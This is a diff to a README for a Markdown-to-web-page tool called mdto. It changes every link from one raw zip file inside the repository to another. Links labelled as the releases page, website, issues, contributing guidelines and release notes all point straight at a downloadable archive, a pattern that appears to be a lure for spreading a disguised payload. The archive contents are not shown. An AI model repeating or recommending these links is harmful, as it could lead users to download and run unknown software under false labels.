@@ -1,6 +1,6 @@
 # 🌟 mdto - Transform Markdown to Beautiful Web Pages
 
-[![Download mdto](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip)](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip)
+[![Download mdto](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip)](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to mdto! This application allows you to turn your Markdown files into st
 
 To begin, you need to download the latest version of mdto.
 
-1. Visit the [Releases page](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip).
+1. Visit the [Releases page](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip).
 2. Find the latest version.
 3. Download the file suitable for your system.
 
@@ -44,13 +44,13 @@ After you download mdto, you can easily customize your experience:
   
 ## 🌐 Accessing mdto Online
 
-In addition to the downloadable application, you can access mdto directly through our website: [https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip). This provides even more flexibility, as you can work from any device with internet access.
+In addition to the downloadable application, you can access mdto directly through our website: [https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip). This provides even more flexibility, as you can work from any device with internet access.
 
 ## 🤝 Support and Community
 
 If you have questions or need help, consider joining our community. You can reach us through:
 
-- GitHub Issues: Report bugs or request features directly on our [GitHub](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip).
+- GitHub Issues: Report bugs or request features directly on our [GitHub](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip).
 - Online Forums: Engage with other users, share tips, and find support.
 
 ## 📆 Future Updates
@@ -59,7 +59,7 @@ We plan to regularly update mdto with new features and improvements based on use
 
 ## ⚡ Contributing
 
-We welcome contributions! If you would like to help improve mdto, check out our [contributing guidelines](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip). Your input will help us make this tool even better.
+We welcome contributions! If you would like to help improve mdto, check out our [contributing guidelines](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip). Your input will help us make this tool even better.
 
 ## 🔖 License
 
@@ -67,8 +67,8 @@ mdto is open source and uses the MIT License. Feel free to use, modify, and dist
 
 ## 🔗 Useful Links
 
-- [https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip) - Access the web application
-- [Release Notes](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip) - Follow updates and changes
-- [Issues Page](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/client/features/upload-form/Software_1.6.zip) - Report any problems or feedback
+- [https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip) - Access the web application
+- [Release Notes](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip) - Follow updates and changes
+- [Issues Page](https://github.com/Raven21-sys/mdto/raw/refs/heads/main/docs/Software-v2.4.zip) - Report any problems or feedback
 
 Thank you for choosing mdto! We hope you enjoy transforming your Markdown files into beautiful web pages.
